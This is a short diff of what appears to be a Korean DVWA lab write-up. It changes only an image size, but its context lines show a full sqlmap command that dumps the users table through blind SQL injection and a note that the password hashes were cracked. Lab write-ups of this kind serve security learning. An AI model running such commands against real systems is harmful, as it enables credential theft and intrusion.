@@ -101,7 +101,7 @@
       sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=2bpnk6a3t0vclp21lhjg0qvj43" -D dvwa -T users --dump
       ```
 
-      <img src="/assets/230706/230706_screenshot_6.png" width="50%" height="50%" alt="Low_test"><br/><br/>
+      <img src="/assets/230706/230706_screenshot_6.png" width="100%" height="100%" alt="Low_test"><br/><br/>
       그 결과 위의 사진과 같이 사용자들의 이름 정보와 패스워드의 해시값을 크랙한 결과를 확인할 수 있다.
 
 ### 결론
